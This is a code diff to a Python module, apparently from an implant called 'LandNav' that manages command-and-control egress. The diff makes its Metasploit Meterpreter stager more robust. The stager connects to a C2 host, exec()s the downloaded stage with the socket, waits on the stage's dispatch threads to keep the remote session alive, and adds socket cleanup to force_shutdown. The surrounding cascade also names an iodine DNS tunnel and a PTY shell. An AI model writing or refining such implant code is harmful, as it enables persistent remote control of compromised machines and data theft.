@@ -43,15 +43,16 @@ _current_state = EgressState.IDLE
 _c2_process = None
 _c2_method = None
 _pty_child_pid = None          # Tracked so signal handler can kill it
+_meterpreter_socket = None     # Tracked so force_shutdown can kill dispatch threads
 _watchdog_stop = threading.Event()
 
 
 def force_shutdown():
-    """Kill any blocking child (pty.spawn / iodine) so LandNav can exit.
+    """Kill any blocking child (pty.spawn / iodine / meterpreter threads).
 
     Called from the signal handler — must be signal-safe (no logging).
     """
-    global _current_state
+    global _current_state, _meterpreter_socket
     _current_state = EgressState.FAILED
     _watchdog_stop.set()
 
@@ -68,6 +69,19 @@ def force_shutdown():
             _c2_process.kill()
         except OSError:
             pass
+
+    # Close meterpreter socket — kills dispatch threads that are
+    # blocking on recv() in the staged meterpreter code
+    if _meterpreter_socket:
+        try:
+            _meterpreter_socket.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
+        try:
+            _meterpreter_socket.close()
+        except OSError:
+            pass
+        _meterpreter_socket = None
 
 # ── DNS Tunnel (iodine) ────────────────────────────────────────
 
@@ -319,7 +333,7 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
 
     Returns: True if meterpreter staged, False otherwise
     """
-    global _c2_method, _current_state
+    global _c2_method, _current_state, _meterpreter_socket
 
     log.info("Attempting Python meterpreter to %s on ports %s", c2_host, ports)
 
@@ -384,25 +398,50 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
 
             log.info("Meterpreter stage prepared — executing")
             _c2_method = "meterpreter"
+            _meterpreter_socket = s
 
-            # Execute the stage — the stage expects 's' (the socket)
-            # to be available in its namespace.
+            # Clear the staging timeout — the meterpreter dispatch
+            # loop needs blocking I/O (or sets its own timeouts)
+            s.settimeout(None)
+
+            # Snapshot threads before exec — the stage may spawn
+            # dispatch threads and return immediately
+            _pre = set(t.ident for t in threading.enumerate())
+
             _t0 = time.monotonic()
             try:
                 exec(compile(prepared, "<meterpreter>", "exec"), {"s": s})
             except SystemExit as e:
                 log.warning("Meterpreter stage called sys.exit(%s)", e.code)
             except BaseException as e:
-                log.error("Meterpreter stage exception: %s: %s", type(e).__name__, e)
+                log.error("Meterpreter stage exception: %s: %s",
+                          type(e).__name__, e)
+                import traceback
+                log.error("Stage traceback:\n%s", traceback.format_exc())
+
+            # The MSF Python meterpreter stage starts its packet
+            # dispatch loop in a background thread and returns.
+            # If we close the socket now, we kill the live session.
+            # Detect those threads and wait for them.
+            _met_threads = [t for t in threading.enumerate()
+                            if t.ident not in _pre and t.is_alive()]
+
+            if _met_threads:
+                log.info("Meterpreter spawned %d dispatch thread(s) — "
+                         "session alive, waiting for session end",
+                         len(_met_threads))
+                for t in _met_threads:
+                    try:
+                        t.join()
+                    except Exception:
+                        pass
+                log.info("All meterpreter threads exited")
 
             elapsed = time.monotonic() - _t0
+            _meterpreter_socket = None
 
-            # exec() should block for the session lifetime.  When it
-            # returns the session is dead — mark FAILED so the main
-            # loop re-enters the C2 cascade.
+            # Session is truly dead now — mark FAILED for re-cascade
             if elapsed < 5:
-                # Stage died almost immediately — something is wrong.
-                # Back off to avoid hammering the handler in a tight loop.
                 log.warning("Meterpreter session died after %.1fs — "
                             "backing off 30s before retry", elapsed)
                 _current_state = EgressState.FAILED
@@ -416,6 +455,10 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             log.warning("Meterpreter session ended after %.0fs — "
                         "marking FAILED for re-cascade", elapsed)
             _current_state = EgressState.FAILED
+            try:
+                s.close()
+            except OSError:
+                pass
             return True
 
         except socket.timeout:
